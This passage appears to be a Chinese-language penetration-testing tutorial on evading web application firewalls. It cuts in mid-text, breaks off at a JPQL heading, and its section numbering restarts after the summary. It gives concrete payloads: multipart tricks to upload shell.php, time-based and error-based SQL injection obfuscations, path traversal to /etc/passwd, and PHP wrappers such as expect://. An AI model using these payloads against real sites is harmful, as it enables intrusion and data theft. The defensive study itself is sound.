Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c \u57fa\u4e8eHTTP\u54cd\u5e94 \u00b6 Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d \u7279\u5b9a\u8d44\u6e90\u6587\u4ef6 \u00b6 \u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch \u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9 \u00b6 1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF \u00b6 1.1\u5bfb\u627e\u6e90\u7ad9 \u00b6 \u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6 1.2\u5229\u7528\u540c\u7f51\u6bb5 \u00b6 \u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7 1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e \u00b6 \u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF 2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF \u00b6 WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b 3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b \u00b6 3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168 \u00b6 Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7 3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e \u00b6 \u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php 3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4 \u00b6 \u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 / 4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7 \u00b6 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf 4.1. SQL\u6ce8\u5165\u7ed5\u8fc7 \u00b6 \u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5 4.2.\u6587\u4ef6\u5305\u542b \u00b6 \u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002 3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790 \u00b6 \u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a 